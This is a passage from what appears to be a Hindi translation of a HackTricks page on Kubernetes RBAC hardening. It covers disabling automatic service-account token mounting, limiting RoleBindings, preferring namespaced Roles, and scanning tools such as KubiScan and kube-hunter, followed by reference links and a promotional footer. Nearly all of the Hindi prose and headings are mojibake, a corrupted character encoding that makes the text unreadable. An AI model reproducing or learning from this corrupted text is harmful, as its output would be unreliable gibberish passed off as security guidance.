![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

рдЗрд╕реЗ рдкреЙрдб рдкрд░ рднреА рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

### **рдирд┐рд╢реНрдЪрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ RoleBindings\ClusterRoleBindings рджреЗрдВ**

RoleBindings\ClusterRoleBindings рдмрдирд╛рддреЗ рд╕рдордп, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдореЗрдВ рд░реЛрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╡рд╛рд▓реЗ рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реА рд╢рд╛рдорд┐рд▓ рд╣реЛрдВред рдРрд╕реЗ рд╕рдореВрд╣реЛрдВ рдореЗрдВ рдЕрдзрд┐рдХ рдирд╣реАрдВ рд░рд╣рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рднреВрд▓рдирд╛ рдЖрд╕рд╛рди рд╣реЛрддрд╛ рд╣реИред

### **ClusterRoles рдФрд░ ClusterRoleBindings рдХреЗ рдмрдЬрд╛рдп Roles рдФрд░ RoleBindings рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**

ClusterRoles рдФрд░ ClusterRoleBindings рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рдпрд╣ рдкреВрд░реЗ рдХреНрд▓рд╕реНрдЯрд░ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред рдРрд╕реЗ рд╕рдореВрд╣ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдЙрд╕рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╕рднреА рдиреЗрдорд╕реНрдкреЗрд╕ рдкрд░ рд╣реЛрддреА рд╣реИрдВ, рдЬреЛ рдХрднреА-рдХрднреА рдЕрдирд╛рд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИред Roles рдФрд░ RoleBindings рдХреЛ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдиреЗрдорд╕реНрдкреЗрд╕ рдкрд░ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред

### **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **рд╕рдВрджрд░реНрдн**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
